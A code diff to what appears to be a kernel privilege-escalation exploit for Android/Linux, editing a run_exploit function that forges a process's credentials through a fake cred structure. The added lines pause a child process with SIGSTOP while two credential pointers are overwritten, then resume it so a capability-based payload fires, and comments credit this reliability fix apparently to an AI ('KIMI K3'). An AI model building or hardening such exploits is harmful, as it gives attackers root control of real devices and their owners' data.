@@ -3883,6 +3883,15 @@ int run_exploit(int argc, char **argv) {
             pr_info("CAPSONLY v2: child_task=%016zx child_cred=%016zx "
                     "target=%016zx\n",
                     g_child_task, g_child_cred, proof_tgt);
+            /*
+             * KIMI K3 SIGSTOP fix (09-20): the DUAL write changes
+             * +0x778 first (W0.pi), then +0x780 (main tree). Between
+             * them, cred != real_cred → any child syscall in this
+             * window fires BUG_ON. Freeze the child for the walk
+             * duration to close the split window. Resume after.
+             */
+            kill(cap_child, SIGSTOP);
+            pr_info("CAPSONLY: child SIGSTOP (split-window closed)\n");
           }
         } else {
           pr_error("CAPSONLY: child report failed (task=%llx cred=%llx)\n",
@@ -3962,6 +3971,13 @@ int run_exploit(int argc, char **argv) {
     if(tf>=0){write(tf,"MAIN_BEFORE_THREADS'+BS+'n",19);close(tf);} }
   run_main_route_threads();
     durable_stage("route_threads_returned");
+    /* KIMI SIGCONT: resume the frozen child — cred is now consistent
+     * (both pointers = same fake cred). The child's next poll will read
+     * its own CapEff and fire the payload on landing. */
+    if (g_cap_child_pid > 0) {
+      kill(g_cap_child_pid, SIGCONT);
+      pr_info("CAPSONLY: child SIGCONT (cred consistent, resume polling)\n");
+    }
   { int tf=open("/data/local/tmp/flow",O_WRONLY|O_CREAT|O_APPEND,0644);
     if(tf>=0){write(tf,"MAIN_AFTER_THREADS'+BS+'n",18);close(tf);} }
     TIMER("  PI route done");
